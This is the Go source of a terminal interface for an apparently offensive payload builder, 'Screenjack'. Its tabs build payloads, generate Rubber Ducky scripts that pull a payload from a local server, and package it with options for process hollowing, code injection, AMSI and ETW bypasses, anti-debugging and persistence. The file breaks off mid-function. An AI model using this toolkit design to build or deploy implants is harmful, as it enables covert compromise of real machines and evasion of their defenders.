package main

import (
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"charm.land/bubbles/v2/filepicker"
	"charm.land/bubbles/v2/help"
	"charm.land/bubbles/v2/key"
	"charm.land/bubbles/v2/list"
	"charm.land/bubbles/v2/spinner"
	"charm.land/bubbles/v2/textinput"
	"charm.land/bubbles/v2/viewport"
	tea "charm.land/bubbletea/v2"
	"charm.land/lipgloss/v2"
)

// Tab represents a main navigation tab
type Tab int

const (
	TabBuild Tab = iota
	TabDucky
	TabServer
	TabPackage
)

func (t Tab) String() string {
	return []string{"Build", "Ducky", "Server", "Package"}[t]
}

// PackageConfig holds RustRedOps packaging options
type PackageConfig struct {
	// Execution method (0=raw, 1+=RustRedOps methods)
	ExecMethod   int
	HollowTarget string

	// Evasion flags (bitfield-style, one per evasionMethods)
	Evasion []bool

	// Persistence
	PersistMethod int // 0=none, 1=registry, 2=xdg, 3=selfdel

	// Encryption
	Encrypt    bool
	EncryptKey string
}

var execMethods = []string{
	"Raw Binary",
	"Ghost [Win]",
	"Hollow [Win]",
	"Herpaderp [Win]",
	"APC Inject [Win]",
	"Thread Hijack [Win]",
	"Threadless [Win]",
	"Module Stomp [Win]",
}

var evasionMethods = []string{
	"AMSI Bypass [Win]",
	"ETW Patch [Win]",
	"NTDLL Unhook [Win]",
	"PPID Spoof [Win]",
	"Block DLLs [Win]",
	"Anti-Debug [Win]",
	"Anti-Analysis [Win]",
	"Direct Syscalls [Win]",
}

var persistMethods = []string{"None", "Registry [Win]", "XDG [Lin]", "Self-Del [Win]"}

// KeyMap defines all keybindings
type KeyMap struct {
	Quit     key.Binding
	Help     key.Binding
	Tab      key.Binding
	ShiftTab key.Binding
	Tab1     key.Binding
	Tab2     key.Binding
	Tab3     key.Binding
	Tab4     key.Binding
	Up       key.Binding
	Down     key.Binding
	Left     key.Binding
	Right    key.Binding
	Toggle   key.Binding
	Confirm  key.Binding
	Server   key.Binding
	Assets   key.Binding
	Logs     key.Binding
	Back     key.Binding
	Build    key.Binding
	Cancel   key.Binding
	Test     key.Binding
	Preview  key.Binding
}

func DefaultKeyMap() KeyMap {
	return KeyMap{
		Quit:     key.NewBinding(key.WithKeys("q", "ctrl+c"), key.WithHelp("q", "quit")),
		Help:     key.NewBinding(key.WithKeys("?"), key.WithHelp("?", "help")),
		Tab:      key.NewBinding(key.WithKeys("tab"), key.WithHelp("tab", "next tab")),
		ShiftTab: key.NewBinding(key.WithKeys("shift+tab"), key.WithHelp("S-tab", "prev tab")),
		Tab1:     key.NewBinding(key.WithKeys("1"), key.WithHelp("1", "Build")),
		Tab2:     key.NewBinding(key.WithKeys("2"), key.WithHelp("2", "Ducky")),
		Tab3:     key.NewBinding(key.WithKeys("3"), key.WithHelp("3", "Server")),
		Tab4:     key.NewBinding(key.WithKeys("4"), key.WithHelp("4", "Package")),
		Up:       key.NewBinding(key.WithKeys("k", "up"), key.WithHelp("k/up", "up")),
		Down:     key.NewBinding(key.WithKeys("j", "down"), key.WithHelp("j/down", "down")),
		Left:     key.NewBinding(key.WithKeys("left"), key.WithHelp("left", "left")),
		Right:    key.NewBinding(key.WithKeys("right"), key.WithHelp("right", "right")),
		Toggle:   key.NewBinding(key.WithKeys(" ", "space"), key.WithHelp("space", "toggle")),
		Confirm:  key.NewBinding(key.WithKeys("enter"), key.WithHelp("enter", "confirm")),
		Server:   key.NewBinding(key.WithKeys("s"), key.WithHelp("s", "server")),
		Assets:   key.NewBinding(key.WithKeys("a"), key.WithHelp("a", "assets")),
		Logs:     key.NewBinding(key.WithKeys("l"), key.WithHelp("l", "logs")),
		Back:     key.NewBinding(key.WithKeys("esc"), key.WithHelp("esc", "back")),
		Build:    key.NewBinding(key.WithKeys("b"), key.WithHelp("b", "build")),
		Cancel:   key.NewBinding(key.WithKeys("c"), key.WithHelp("c", "cancel")),
		Test:     key.NewBinding(key.WithKeys("t"), key.WithHelp("t", "test")),
		Preview:  key.NewBinding(key.WithKeys("p"), key.WithHelp("p", "preview")),
	}
}

func (k KeyMap) ShortHelp() []key.Binding {
	return []key.Binding{k.Tab1, k.Tab2, k.Tab3, k.Tab4, k.Build, k.Test, k.Server, k.Quit}
}

func (k KeyMap) FullHelp() [][]key.Binding {
	return [][]key.Binding{
		{k.Tab1, k.Tab2, k.Tab3, k.Tab4, k.Tab},
		{k.Up, k.Down, k.Left, k.Right},
		{k.Toggle, k.Confirm, k.Build, k.Cancel},
		{k.Server, k.Assets, k.Test, k.Preview, k.Logs, k.Quit},
	}
}

// Modal types
type Modal int

const (
	ModalNone Modal = iota
	ModalAssets
	ModalFilePicker
	ModalLogs
	ModalBuildLogs    // build output logs with copy support
	ModalPreview      // asset preview
	ModalDuckyPreview // ducky script preview
	ModalPackage
	ModalInput // generic text input modal
)

// Fixed viewport dimensions (in chars)
const (
	viewportW = 120 // main content width
	viewportH = 35  // main content height
	mainBoxW  = 75  // main content box width
	sidebarW  = 28  // sidebar width
	gap       = 1   // vertical gap between elements
)

// vstack joins elements vertically with consistent gap
func vstack(elements ...string) string {
	var filtered []string
	for _, e := range elements {
		if e != "" {
			filtered = append(filtered, e)
		}
	}
	return lipgloss.JoinVertical(lipgloss.Left, filtered...)
}

// hstack joins elements horizontally with gap
func hstack(elements ...string) string {
	return lipgloss.JoinHorizontal(lipgloss.Top, elements...)
}

// Styles
var (
	// Colors - amber/rust oxide palette
	colorRust     = lipgloss.Color("#D97706")
	colorAmber    = lipgloss.Color("#F59E0B")
	colorOrange   = lipgloss.Color("#EA580C")
	colorEmerald  = lipgloss.Color("#10B981")
	colorCyan     = lipgloss.Color("#06B6D4")
	colorRose     = lipgloss.Color("#F43F5E")
	colorStone50  = lipgloss.Color("#FAFAF9")
	colorStone400 = lipgloss.Color("#A8A29E")
	colorStone600 = lipgloss.Color("#57534E")
	colorStone800 = lipgloss.Color("#292524")

	styleTitle = lipgloss.NewStyle().
			Foreground(colorAmber).
			Bold(true)

	styleActiveTab = lipgloss.NewStyle().
			Foreground(colorStone800).
			Background(colorAmber).
			Bold(true).
			Padding(0, 2)

	styleInactiveTab = lipgloss.NewStyle().
				Foreground(colorStone400).
				Padding(0, 2)

	styleBox = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(colorStone600).
			Padding(1, 2)

	styleActiveBox = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(colorAmber).
			Padding(1, 2)

	styleLabel = lipgloss.NewStyle().
			Foreground(colorStone400).
			Width(12).
			Align(lipgloss.Right)

	styleValue = lipgloss.NewStyle().
			Foreground(colorStone50).
			PaddingLeft(1)

	styleFocusedValue = lipgloss.NewStyle().
				Foreground(colorAmber).
				Bold(true).
				PaddingLeft(1)

	styleStatus = lipgloss.NewStyle().
			Foreground(colorStone400).
			Padding(0, 1)

	styleSuccess = lipgloss.NewStyle().Foreground(colorEmerald)
	styleError   = lipgloss.NewStyle().Foreground(colorRose)
	styleWarn    = lipgloss.NewStyle().Foreground(colorOrange)

	styleModalOverlay = lipgloss.NewStyle().
				Border(lipgloss.DoubleBorder()).
				BorderForeground(colorAmber).
				Padding(1, 2)
)

// TargetItem implements list.Item for build targets
type TargetItem struct {
	Name     string
	Target   string
	Selected bool
}

func (t TargetItem) FilterValue() string { return t.Name }
func (t TargetItem) Title() string       { return t.Name }
func (t TargetItem) Description() string { return t.Target }

// AssetItem implements list.Item for assets
type AssetItem struct {
	Name     string
	Selected bool
}

func (a AssetItem) FilterValue() string { return a.Name }
func (a AssetItem) Title() string       { return a.Name }
func (a AssetItem) Description() string { return "" }

// TargetDelegate renders target items
type TargetDelegate struct{}

func (d TargetDelegate) Height() int                             { return 1 }
func (d TargetDelegate) Spacing() int                            { return 0 }
func (d TargetDelegate) Update(_ tea.Msg, _ *list.Model) tea.Cmd { return nil }

func (d TargetDelegate) Render(w io.Writer, m list.Model, index int, listItem list.Item) {
	item, ok := listItem.(TargetItem)
	if !ok {
		return
	}

	cursor := "  "
	if index == m.Index() {
		cursor = "> "
	}

	check := "[ ]"
	style := lipgloss.NewStyle()
	if item.Selected {
		check = "[x]"
		style = style.Foreground(colorCyan)
	}
	if index == m.Index() {
		style = style.Foreground(colorAmber).Bold(true)
		if item.Selected {
			style = style.Foreground(colorCyan).Background(colorStone800)
		}
	}

	fmt.Fprintf(w, "%s%s %s", cursor, check, style.Render(item.Name))
}

// AssetDelegate renders asset items
type AssetDelegate struct{}

func (d AssetDelegate) Height() int                             { return 1 }
func (d AssetDelegate) Spacing() int                            { return 0 }
func (d AssetDelegate) Update(_ tea.Msg, _ *list.Model) tea.Cmd { return nil }

func (d AssetDelegate) Render(w io.Writer, m list.Model, index int, listItem list.Item) {
	item, ok := listItem.(AssetItem)
	if !ok {
		return
	}

	cursor := "  "
	style := lipgloss.NewStyle()
	if index == m.Index() {
		cursor = "> "
		style = style.Foreground(colorAmber).Bold(true)
	}
	if item.Selected {
		cursor = "+ "
		style = style.Foreground(colorCyan)
		if index == m.Index() {
			style = style.Background(colorStone800)
		}
	}

	fmt.Fprintf(w, "%s%s", cursor, style.Render(item.Name))
}

// TUIModel is the main model
type TUIModel struct {
	width, height int

	// Navigation
	activeTab Tab
	keys      KeyMap
	help      help.Model

	// Modal state
	modal Modal

	// Build tab
	targetList  list.Model
	buildFocus  int // 0=list, 1=embed toggle, 2=docker toggle, 3=build button
	buildMsg    string
	dockerBuild bool // true = build via Docker, false = native cargo

	// Build system
	buildState      BuildState
	currentBuild    *BuildJob
	queuedBuild     *BuildJob // max 1 queued, newest wins
	buildProgress   []TargetProgress
	buildLogs       []string // capped at 100 lines
	buildSpinner    spinner.Model
	logExpanded     bool
	embedAsset      bool // true = embed, false = HTTP fetch
	buildCancel     context.CancelFunc
	buildProgressCh chan TargetProgress
	buildLogCh      chan string
	buildDoneCh     <-chan buildCompleteMsg
	logViewport     viewport.Model

	// Assets
	assetList     list.Model
	selectedAsset string
	filePicker    filepicker.Model
	pathInput     textinput.Model // for typing paths directly
	pathInputMode bool            // true when typing path, false when browsing
	assetPreview  *PreviewModel   // ASCII preview of selected asset

	// Ducky tab
	duckyOS      string
	urlInput     textinput.Model
	payloadInput textinput.Model
	duckyPersist bool // include --persist flag
	duckyFocus   int  // 0=OS, 1=URL, 2=payload, 3=persist, 4=generate
	duckyMsg     string
	duckyLastGen string // timestamp of last generation

	// Server tab
	server   *Server
	serverIP string
	httpLogs []LogEntry

	// Package tab
	pkgConfig PackageConfig
	pkgFocus  int    // 0-7 for each field
	pkgMsg    string // build output

	// Input modal
	inputModal      textinput.Model
	inputModalTitle string
	inputModalCB    func(string) // callback when confirmed

	// Status
	status string

	// Config
	config Config
}

const logo = `  ____                            _            _
 / ___|  ___ _ __ ___  ___ _ __  (_) __ _  ___| | __
 \___ \ / __| '__/ _ \/ _ \ '_ \ | |/ _` + "`" + ` |/ __| |/ /
  ___) | (__| | |  __/  __/ | | || | (_| | (__|   <
 |____/ \___|_|  \___|\___|_| |_|/ |\__,_|\___|_|\_\
                               |__/                 `

func NewTUIModel() TUIModel {
	// Load config
	cfg := LoadConfig()

	// Target list - native and docker targets
	targets := []list.Item{
		TargetItem{Name: "linux-gnu", Target: "x86_64-unknown-linux-gnu", Selected: false},
		TargetItem{Name: "linux-musl", Target: "x86_64-unknown-linux-musl", Selected: false},
		TargetItem{Name: "linux-alpine", Target: "docker-alpine", Selected: false},
		TargetItem{Name: "linux-debian", Target: "docker-debian", Selected: false},
		TargetItem{Name: "windows", Target: "x86_64-pc-windows-gnu", Selected: false},
	}
	targetList := list.New(targets, TargetDelegate{}, 40, 8)
	targetList.SetShowTitle(false)
	targetList.SetShowStatusBar(false)
	targetList.SetShowHelp(false)
	targetList.SetFilteringEnabled(false)

	// Asset list (empty initially)
	assetList := list.New([]list.Item{}, AssetDelegate{}, 40, 10)
	assetList.SetShowTitle(false)
	assetList.SetShowStatusBar(false)
	assetList.SetShowHelp(false)
	assetList.SetFilteringEnabled(true)
	assetList.Title = "Assets"

	// File picker
	fp := filepicker.New()
	fp.AllowedTypes = []string{".gif", ".png", ".jpg", ".jpeg"}
	fp.CurrentDirectory, _ = os.UserHomeDir()
	fp.ShowHidden = false
	fp.SetHeight(15)

	// Text inputs for Ducky tab - use config defaults
	defaultURL := fmt.Sprintf("http://localhost:%d", cfg.ServerPort)
	urlInput := textinput.New()
	urlInput.Placeholder = defaultURL
	urlInput.SetValue(defaultURL)
	urlInput.SetWidth(30)
	urlInput.Prompt = ""

	payloadInput := textinput.New()
	payloadInput.Placeholder = cfg.PayloadName
	payloadInput.SetValue(cfg.PayloadName)
	payloadInput.SetWidth(20)
	payloadInput.Prompt = ""

	// Path input for adding assets
	pathInput := textinput.New()
	pathInput.Placeholder = "~/path/to/file.gif"
	pathInput.SetWidth(50)
	pathInput.Prompt = "> "

	// Help
	h := help.New()
	h.ShowAll = false

	// Input modal
	inputModal := textinput.New()
	inputModal.SetWidth(40)
	inputModal.Prompt = "> "

	// Log viewport for scrollable build logs - larger for verbose output
	logVP := viewport.New(viewport.WithWidth(100), viewport.WithHeight(20))
	logVP.Style = lipgloss.NewStyle().Foreground(colorStone50)

	// Build spinner
	sp := spinner.New(spinner.WithSpinner(spinner.Dot))
	sp.Style = lipgloss.NewStyle().Foreground(colorAmber)

	return TUIModel{
		activeTab:     TabBuild,
		keys:          DefaultKeyMap(),
		help:          h,
		targetList:    targetList,
		assetList:     assetList,
		filePicker:    fp,
		pathInput:     pathInput,
		duckyOS:       cfg.DefaultOS,
		urlInput:      urlInput,
		payloadInput:  payloadInput,
		server:        NewServer(),
		serverIP:      GetLocalIP(),
		inputModal:    inputModal,
		pkgConfig:     PackageConfig{HollowTarget: "svchost.exe", Evasion: make([]bool, len(evasionMethods))},
		status:        "Ready",
		buildState:    BuildIdle,
		buildProgress: []TargetProgress{},
		buildLogs:     []string{},
		buildSpinner:  sp,
		embedAsset:    cfg.EmbedAsset,
		logViewport:   logVP,
		config:        cfg,
		selectedAsset: cfg.LastAsset,
	}
}

func (m TUIModel) Init() tea.Cmd {
	return tea.Batch(
		scanAssetsCmd(),
		m.filePicker.Init(),
	)
}

// scanAssetsCmd scans the assets directory
func scanAssetsCmd() tea.Cmd {
	return func() tea.Msg {
		var assets []string
		entries, _ := os.ReadDir("../assets")
		for _, e := range entries {
			if !e.IsDir() {
				name := e.Name()
				ext := strings.ToLower(filepath.Ext(name))
				if ext == ".gif" || ext == ".png" || ext == ".jpg" || ext == ".jpeg" {
					assets = append(assets, name)
				}
			}
		}
		return assetsScannedMsg{assets: assets}
	}
}

type assetsScannedMsg struct{ assets []string }
type fileSelectedMsg struct{ path string }

func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd

	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width, m.height = msg.Width, msg.Height
		m.help.SetWidth(msg.Width)
		m.targetList.SetSize(mainBoxW-4, 6)
		m.assetList.SetSize(mainBoxW-4, 12)
		m.filePicker.SetHeight(15)
		return m, nil

	// ponytail: mouse support disabled for now, re-enable with bubblezone later

	case assetsScannedMsg:
		items := make([]list.Item, len(msg.assets))
		for i, a := range msg.assets {
			items[i] = AssetItem{Name: a, Selected: a == m.selectedAsset}
		}
		m.assetList.SetItems(items)
		return m, nil

	case fileSelectedMsg:
		// Copy file to assets
		src := msg.path
		dst := "../assets/" + filepath.Base(src)
		if err := copyFile(src, dst); err != nil {
			m.status = styleError.Render("Error: " + err.Error())
		} else {
			m.status = styleSuccess.Render("Added " + filepath.Base(src))
			m.selectedAsset = filepath.Base(src)
		}
		m.modal = ModalNone
		return m, scanAssetsCmd()

	case spinner.TickMsg:
		if m.buildState == BuildRunning {
			var cmd tea.Cmd
			m.buildSpinner, cmd = m.buildSpinner.Update(msg)
			return m, cmd
		}
		return m, nil

	case progressMsg:
		// Update progress for this target
		found := false
		for i, p := range m.buildProgress {
			if p.Target == TargetProgress(msg).Target {
				m.buildProgress[i] = TargetProgress(msg)
				found = true
				break
			}
		}
		if !found {
			m.buildProgress = append(m.buildProgress, TargetProgress(msg))
		}
		return m, m.listenForBuildUpdates()

	case logMsg:
		m.buildLogs = append(m.buildLogs, string(msg))
		if len(m.buildLogs) > 500 {
			m.buildLogs = m.buildLogs[len(m.buildLogs)-500:]
		}
		return m, m.listenForBuildUpdates()

	case buildCompleteMsg:
		result := msg.toResult()
		m.buildState = BuildIdle
		m.buildCancel = nil
		// Get payload sizes
		sizes := getPayloadSizes()
		sizeInfo := ""
		if sizes != "" {
			sizeInfo = " " + sizes
		}
		if result.Success {
			m.status = styleSuccess.Render("[OK] " + result.Summary + sizeInfo)
		} else if result.Partial {
			m.status = styleWarn.Render("[!] " + result.Summary + sizeInfo)
		} else if result.Cancelled {
			m.status = styleStatus.Render("Build cancelled")
		} else {
			m.status = styleError.Render("[X] " + result.Summary)
		}
		// Check for queued build
		if m.queuedBuild != nil {
			job := m.queuedBuild
			m.queuedBuild = nil
			return m, m.startBuildCmd(job)
		}
		return m, nil

	case startBuildMsg:
		return m.startBuild(msg.job)

	case packageDoneMsg:
		if msg.ok {
			m.pkgMsg = styleSuccess.Render("[OK] " + msg.msg)
			m.status = styleSuccess.Render("Package complete")
		} else {
			m.pkgMsg = styleError.Render("[X] " + msg.msg)
			m.status = styleError.Render("Package failed")
		}
		return m, nil

	case testDoneMsg:
		m.status = styleSuccess.Render("Test complete")
		return m, nil

	case tea.KeyMsg:
		// Modal handling
		if m.modal != ModalNone {
			return m.updateModal(msg)
		}

		// Global keys
		switch {
		case key.Matches(msg, m.keys.Quit):
			m.server.Stop()
			// Save config with current values
			m.config.EmbedAsset = m.embedAsset
			m.config.LastAsset = m.selectedAsset
			m.config.DefaultOS = m.duckyOS
			_ = SaveConfig(m.config)
			return m, tea.Quit

		case key.Matches(msg, m.keys.Help):
			m.help.ShowAll = !m.help.ShowAll
			return m, nil

		// Tab navigation: 1-4 or tab/shift+tab
		case key.Matches(msg, m.keys.Tab):
			m.activeTab = Tab((int(m.activeTab) + 1) % 4)
			return m, nil
		case key.Matches(msg, m.keys.ShiftTab):
			m.activeTab = Tab((int(m.activeTab) + 3) % 4) // +3 = -1 mod 4
			return m, nil
		case key.Matches(msg, m.keys.Tab1):
			m.activeTab = TabBuild
			return m, nil
		case key.Matches(msg, m.keys.Tab2):
			m.activeTab = TabDucky
			return m, nil
		case key.Matches(msg, m.keys.Tab3):
			m.activeTab = TabServer
			return m, nil
		case key.Matches(msg, m.keys.Tab4):
			m.activeTab = TabPackage
			return m, nil

		// Global actions
		case key.Matches(msg, m.keys.Assets):
			m.modal = ModalAssets
			return m, nil

		case key.Matches(msg, m.keys.Server):
			return m, m.toggleServer()

		case key.Matches(msg, m.keys.Logs):
			// Context-sensitive: build logs modal on Build tab, server logs otherwise
			if (m.activeTab == TabBuild || m.buildState == BuildRunning) && len(m.buildLogs) > 0 {
				m.logViewport.SetContent(strings.Join(m.buildLogs, "\n"))
				m.logViewport.GotoBottom()
				m.modal = ModalBuildLogs
			} else if m.server.IsRunning() {
				m.modal = ModalLogs
			}
			return m, nil

		case key.Matches(msg, m.keys.Build):
			return m.handleBuildKey()

		case key.Matches(msg, m.keys.Cancel):
			return m.handleCancelKey()

		case key.Matches(msg, m.keys.Test):
			return m.handleTestKey()

		case key.Matches(msg, m.keys.Preview):
			// Preview in Ducky tab shows script, elsewhere shows asset
			if m.activeTab == TabDucky {
				m.modal = ModalDuckyPreview
			} else if m.selectedAsset != "" {
				preview := NewPreview(m.selectedAsset, 60, 20)
				m.assetPreview = &preview
				m.modal = ModalPreview
			}
			return m, nil
		}

		// Tab-specific updates
		switch m.activeTab {
		case TabBuild:
			return m.updateBuildTab(msg)
		case TabDucky:
			return m.updateDuckyTab(msg)
		case TabServer:
			return m.updateServerTab(msg)
		case TabPackage:
			return m.updatePackageTab(msg)
		}
	}

	return m, tea.Batch(cmds...)
}

func (m TUIModel) updateModal(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	switch m.modal {
	case ModalAssets:
		switch {
		case key.Matches(msg, m.keys.Back):
			m.modal = ModalNone
			return m, nil
		case msg.String() == "n":
			// Open file picker
			m.modal = ModalFilePicker
			return m, m.filePicker.Init()
		case msg.String() == "p":
			// Preview hovered asset
			if item, ok := m.assetList.SelectedItem().(AssetItem); ok {
				preview := NewPreview(item.Name, 60, 20)
				m.assetPreview = &preview
				m.modal = ModalPreview
			}
			return m, nil
		case msg.String() == "d", msg.String() == "x":
			// Delete hovered asset
			if item, ok := m.assetList.SelectedItem().(AssetItem); ok {
				path := "../assets/" + item.Name
				if err := os.Remove(path); err != nil {
					m.status = styleError.Render("Delete failed: " + err.Error())
				} else {
					m.status = styleSuccess.Render("Deleted " + item.Name)
					if m.selectedAsset == item.Name {
						m.selectedAsset = ""
					}
				}
				return m, scanAssetsCmd()
			}
			return m, nil
		case key.Matches(msg, m.keys.Confirm):
			// Select current asset
			if item, ok := m.assetList.SelectedItem().(AssetItem); ok {
				m.selectedAsset = item.Name
				// Update list to show selection
				items := m.assetList.Items()
				for i, it := range items {
					if a, ok := it.(AssetItem); ok {
						a.Selected = a.Name == m.selectedAsset
						items[i] = a
					}
				}
				m.assetList.SetItems(items)
			}
			return m, nil
		default:
			var cmd tea.Cmd
			m.assetList, cmd = m.assetList.Update(msg)
			return m, cmd
		}

	case ModalFilePicker:
		// If path input is focused, handle typing
		if m.pathInputMode {
			switch msg.String() {
			case "esc":
				m.pathInputMode = false
				m.pathInput.Blur()
				return m, nil
			case "enter":
				// Try to add the file
				path := expandPath(m.pathInput.Value())
				if path != "" {
					m.pathInput.SetValue("")
					m.pathInput.Blur()
					m.pathInputMode = false
					return m, func() tea.Msg { return fileSelectedMsg{path: path} }
				}
				return m, nil
			case "tab":
				// Switch to browser mode
				m.pathInputMode = false
				m.pathInput.Blur()
				return m, nil
			default:
				var cmd tea.Cmd
				m.pathInput, cmd = m.pathInput.Update(msg)
				return m, cmd
			}
		}

		// Browser mode
		switch {
		case key.Matches(msg, m.keys.Back):
			m.modal = ModalAssets
			return m, nil
		case msg.String() == "/", msg.String() == ":":
			// Switch to path input mode
			m.pathInputMode = true
			m.pathInput.Focus()
			return m, textinput.Blink
		default:
			var cmd tea.Cmd
			m.filePicker, cmd = m.filePicker.Update(msg)

			// Check if file was selected
			if didSelect, path := m.filePicker.DidSelectFile(msg); didSelect {
				return m, func() tea.Msg { return fileSelectedMsg{path: path} }
			}
			return m, cmd
		}

	case ModalLogs:
		if key.Matches(msg, m.keys.Back) || msg.String() == "l" {
			m.modal = ModalNone
		}
		return m, nil

	case ModalBuildLogs:
		switch msg.String() {
		case "esc", "l":
			m.modal = ModalNone
			return m, nil
		case "c":
			// Copy logs to clipboard
			logText := strings.Join(m.buildLogs, "\n")
			if err := copyToClipboard(logText); err != nil {
				m.status = styleError.Render("Copy failed: " + err.Error())
			} else {
				m.status = styleSuccess.Render("Logs copied to clipboard")
			}
			return m, nil
		default:
			// Pass to viewport for scrolling (j/k, up/down, pgup/pgdn)
			var cmd tea.Cmd
			m.logViewport, cmd = m.logViewport.Update(msg)
			return m, cmd
		}

	case ModalInput:
		switch msg.String() {
		case "esc":
			m.modal = ModalNone
			m.inputModal.Blur()
			return m, nil
		case "enter":
			if m.inputModalCB != nil {
				m.inputModalCB(m.inputModal.Value())
			}
			m.modal = ModalNone
			m.inputModal.Blur()
			return m, nil
		default:
			var cmd tea.Cmd
			m.inputModal, cmd = m.inputModal.Update(msg)
			return m, cmd
		}

	case ModalPreview:
		if key.Matches(msg, m.keys.Back) || msg.String() == "p" {
			m.modal = ModalNone
			m.assetPreview = nil
		}
		return m, nil

	case ModalDuckyPreview:
		switch msg.String() {
		case "esc", "p":
			m.modal = ModalNone
		case "c":
			// Copy script to clipboard
			if err := copyToClipboard(m.genDuckyScript()); err != nil {
				m.status = styleError.Render("Copy failed: " + err.Error())
			} else {
				m.status = styleSuccess.Render("Script copied to clipboard")
			}
		}
		return m, nil
	}

	return m, nil
}

func (m TUIModel) updateBuildTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// buildFocus: 0=target list, 1=embed toggle, 2=docker toggle, 3=build button
	switch {
	case key.Matches(msg, m.keys.Down):
		if m.buildFocus == 0 {
			// Check if at bottom of list
			if m.targetList.Index() >= len(m.targetList.Items())-1 {
				m.buildFocus = 1
				return m, nil
			}
			var cmd tea.Cmd
			m.targetList, cmd = m.targetList.Update(msg)
			return m, cmd
		} else if m.buildFocus < 3 {
			m.buildFocus++
		}
		return m, nil
	case key.Matches(msg, m.keys.Up):
		if m.buildFocus > 1 {
			m.buildFocus--
			return m, nil
		} else if m.buildFocus == 1 {
			m.buildFocus = 0
			return m, nil
		}
		var cmd tea.Cmd
		m.targetList, cmd = m.targetList.Update(msg)
		return m, cmd
	case key.Matches(msg, m.keys.Toggle), key.Matches(msg, m.keys.Confirm):
		switch m.buildFocus {
		case 0: // Toggle target selection
			if item, ok := m.targetList.SelectedItem().(TargetItem); ok {
				item.Selected = !item.Selected
				items := m.targetList.Items()
				items[m.targetList.Index()] = item
				m.targetList.SetItems(items)
			}
		case 1: // Toggle embed mode
			m.embedAsset = !m.embedAsset
		case 2: // Toggle docker mode
			m.dockerBuild = !m.dockerBuild
		case 3: // Build button
			return m.handleBuildKey()
		}
		return m, nil
	}
	return m, nil
}

func (m TUIModel) updateDuckyTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// If a text input is focused, route to it
	if m.urlInput.Focused() || m.payloadInput.Focused() {
		switch msg.String() {
		case "esc", "enter":
			m.urlInput.Blur()
			m.payloadInput.Blur()
			return m, nil
		}
		var cmd tea.Cmd
		if m.urlInput.Focused() {
			m.urlInput, cmd = m.urlInput.Update(msg)
		} else {
			m.payloadInput, cmd = m.payloadInput.Update(msg)
		}
		return m, cmd
	}

	// duckyFocus: 0=OS, 1=URL, 2=payload, 3=persist, 4=generate
	switch {
	case key.Matches(msg, m.keys.Up):
		m.duckyFocus = max(0, m.duckyFocus-1)
	case key.Matches(msg, m.keys.Down):
		m.duckyFocus = min(4, m.duckyFocus+1)
	case key.Matches(msg, m.keys.Toggle), key.Matches(msg, m.keys.Confirm):
		switch m.duckyFocus {
		case 0: // Toggle OS
			if m.duckyOS == "linux" {
				m.duckyOS = "windows"
			} else {
				m.duckyOS = "linux"
			}
		case 1: // Focus URL input
			m.urlInput.Focus()
			return m, textinput.Blink
		case 2: // Focus payload input
			m.payloadInput.Focus()
			return m, textinput.Blink
		case 3: // Toggle persist
			m.duckyPersist = !m.duckyPersist
		case 4: // Generate button
			m.genDucky()
			m.status = styleSuccess.Render("Ducky script saved")
		}
	}
	return m, nil
}

func (m TUIModel) updateServerTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// Server tab specific keys if needed
	return m, nil
}

func (m TUIModel) updatePackageTab(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
	// Focus layout:
	// Left col:  0..execN-1 (exec), execN..execN+evasN-1 (evasion)
	// Right col: execN+evasN..+persistN-1 (persist), +persistN (encrypt), +persistN+1 (build)
	execN := len(execMethods)
	evasN := len(evasionMethods)
	persN := len(persistMethods)
	rightStart := execN + evasN
	rightEnd := rightStart + persN // encrypt
	buildIdx := rightEnd + 1
	maxFocus := buildIdx

	switch {
	case key.Matches(msg, m.keys.Up):
		if m.pkgFocus > 0 {
			m.pkgFocus--
		}
	case key.Matches(msg, m.keys.Down):
		if m.pkgFocus < maxFocus {
			m.pkgFocus++
		}
	case key.Matches(msg, m.keys.Left):
		// Right col → Left col
		if m.pkgFocus >= rightStart && m.pkgFocus < rightStart+persN {
			// persist → exec (map by relative position)
			relPos := m.pkgFocus - rightStart
			if relPos < execN {
				m.pkgFocus = relPos
			}
		} else if m.pkgFocus == rightEnd {
			// encrypt → first evasion
			m.pkgFocus = execN
		}
	case key.Matches(msg, m.keys.Right):
		// Left col → Right col
		if m.pkgFocus < execN {
			// exec → persist
			m.pkgFocus = rightStart + m.pkgFocus
			if m.pkgFocus >= rightStart+persN {
				m.pkgFocus = rightStart + persN - 1
			}
		} else if m.pkgFocus >= execN && m.pkgFocus < execN+evasN {
			// evasion → encrypt
			m.pkgFocus = rightEnd
		}
	case key.Matches(msg, m.keys.Toggle), key.Matches(msg, m.keys.Confirm):
		switch {
		case m.pkgFocus < execN:
			m.pkgConfig.ExecMethod = m.pkgFocus
			if m.pkgFocus == 2 { // hollow
				m.inputModalTitle = "Hollow Target Process"
				m.inputModal.Placeholder = "e.g. svchost.exe"
				m.inputModal.SetValue(m.pkgConfig.HollowTarget)
				m.inputModalCB = func(val string) { m.pkgConfig.HollowTarget = val }
				m.modal = ModalInput
				m.inputModal.Focus()
				return m, textinput.Blink
			}
		case m.pkgFocus >= execN && m.pkgFocus < execN+evasN:
			idx := m.pkgFocus - execN
			m.pkgConfig.Evasion[idx] = !m.pkgConfig.Evasion[idx]
		case m.pkgFocus >= rightStart && m.pkgFocus < rightStart+persN:
			m.pkgConfig.PersistMethod = m.pkgFocus - rightStart
		case m.pkgFocus == rightEnd:
			m.pkgConfig.Encrypt = !m.pkgConfig.Encrypt
		case m.pkgFocus == buildIdx:
			return m, m.buildPackage()
		}
	}
	return m, nil
}

type packageDoneMsg struct {
	ok  bool
	msg string
}

func (m *TUIModel) buildPackage() tea.Cmd {
	return func() tea.Msg {
		// Check if any evasion is enabled
		anyEvasion := false
		for _, e := range m.pkgConfig.Evasion {
			if e {
				anyEvasion = true
				break
			}
		}

		// Determine which payload(s) needed
		needsWindows := m.pkgConfig.ExecMethod > 0 || // Ghost/Hollow/etc are Windows-only
			anyEvasion || // All evasion methods are Windows
